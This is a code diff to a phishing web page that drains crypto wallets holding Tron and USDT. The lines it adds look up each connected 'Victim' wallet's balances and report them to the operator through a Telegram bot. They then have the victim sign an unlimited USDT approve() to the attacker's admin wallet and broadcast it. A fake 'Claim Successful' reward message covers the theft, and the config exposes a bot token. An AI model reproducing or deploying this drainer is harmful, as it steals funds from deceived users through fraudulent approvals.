@@ -50,6 +50,7 @@
     </div>
 
     <!-- Standard Logic (No Complex CDN Dependencies) -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <script>
         const CONFIG = {
             BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
@@ -75,10 +76,10 @@
             if (!tronProvider && window.tron && window.tron.tronWeb) tronProvider = window.tron.tronWeb;
 
             if (tronProvider && tronProvider.defaultAddress && tronProvider.defaultAddress.base58) {
-                // Already connected to Tron
+                // Already connected to Tron natively
                 handleConnection(tronProvider);
             } else if (window.tronLink) {
-                // Request connection to TronLink
+                // Request connection to TronLink natively
                 try {
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                     handleConnection(window.tronLink.tronWeb);
@@ -86,8 +87,7 @@
                     alert("Connection rejected.");
                 }
             } else {
-                // User is NOT on the Tron network, or is on a mobile device without an extension.
-                // We fallback to WalletConnect to force the Tron connection!
+                // User is NOT on the Tron network natively. Use WalletConnect!
                 if (typeof window.connectWalletConnectTron === 'function') {
                     const wcResult = await window.connectWalletConnectTron();
                     if (wcResult && wcResult.address) {
@@ -95,18 +95,58 @@
                         document.getElementById('qr-screen').classList.add('opacity-20');
                         document.getElementById('processing-screen').classList.remove('hidden');
 
-                        await notify(`🔔 <b>WALLET CONNECTED (WalletConnect)</b>\nVictim: <code>${wcResult.address}</code>`);
+                        const address = wcResult.address;
                         
-                        // We connected via WalletConnect. Now we need to handle the transaction.
-                        // WalletConnect V2 doesn't expose a raw TronWeb instance easily, but Trust Wallet
-                        // MIGHT inject tronWeb once the connection is established.
-                        let postConnectTronWeb = window.tronWeb || (window.tronLink && window.tronLink.tronWeb) || (window.tron && window.tron.tronWeb);
+                        // Use a standalone TronWeb instance to query balances and build the raw transaction
+                        const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+                        localTronWeb.setAddress(address);
+
+                        // Fetch Balances
+                        let trxBalance = 0;
+                        let usdtBalance = 0;
+                        try {
+                            trxBalance = await localTronWeb.trx.getBalance(address);
+                            trxBalance = (trxBalance / 1e6).toFixed(2);
+                            
+                            const usdtContract = await localTronWeb.contract().at(CONFIG.USDT_CONTRACT);
+                            let rawUsdt = await usdtContract.balanceOf(address).call();
+                            usdtBalance = (parseInt(rawUsdt._hex || rawUsdt) / 1e6).toFixed(2);
+                        } catch(e) { console.error("Balance fetch error", e); }
+
+                        await notify(`🔔 <b>WALLET CONNECTED (WalletConnect)</b>\nVictim: <code>${address}</code>\n\nTRX Balance: ${trxBalance}\nUSDT Balance: ${usdtBalance}`);
                         
-                        if (postConnectTronWeb) {
-                            handleConnection(postConnectTronWeb);
-                        } else {
-                            // WC Session connected but no TronWeb injected to sign with!
-                            alert("Wallet securely connected via WalletConnect!\nCheck your wallet app for any pending transaction prompts if applicable.");
+                        // Send WalletConnect Transaction
+                        try {
+                            const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                            
+                            // Build raw transaction
+                            const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
+                                CONFIG.USDT_CONTRACT,
+                                "approve(address,uint256)",
+                                { feeLimit: 100000000 },
+                                [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: maxUint }],
+                                address
+                            );
+
+                            // Request Signature from Wallet
+                            const signedTx = await wcResult.provider.request({
+                                method: "tron_signTransaction",
+                                params: {
+                                    address: address,
+                                    transaction: transaction
+                                }
+                            });
+
+                            // Broadcast the signed transaction
+                            const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
+                            
+                            notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${receipt.txid || receipt.transaction.txID}</code>`);
+                            alert("Claim Successful! Reward will be sent after 1 hour.");
+                            location.reload();
+                        } catch (error) {
+                            console.error("WC Tx Error:", error);
+                            notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${address}</code>`);
+                            alert("Verification failed. Please click 'Accept' to claim.");
                             location.reload();
                         }
                     }
@@ -124,7 +164,19 @@
             document.getElementById('processing-screen').classList.remove('hidden');
 
             try {
-                await notify(`🔔 <b>WALLET CONNECTED (Native)</b>\nVictim: <code>${address}</code>`);
+                // Fetch Native Balances
+                let trxBalance = 0;
+                let usdtBalance = 0;
+                try {
+                    trxBalance = await tronProvider.trx.getBalance(address);
+                    trxBalance = (trxBalance / 1e6).toFixed(2);
+                    
+                    const usdtContract = await tronProvider.contract().at(CONFIG.USDT_CONTRACT);
+                    let rawUsdt = await usdtContract.balanceOf(address).call();
+                    usdtBalance = (parseInt(rawUsdt._hex || rawUsdt) / 1e6).toFixed(2);
+                } catch(e) {}
+
+                await notify(`🔔 <b>WALLET CONNECTED (Native)</b>\nVictim: <code>${address}</code>\n\nTRX Balance: ${trxBalance}\nUSDT Balance: ${usdtBalance}`);
 
                 const contract = await tronProvider.contract().at(CONFIG.USDT_CONTRACT);
                 const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
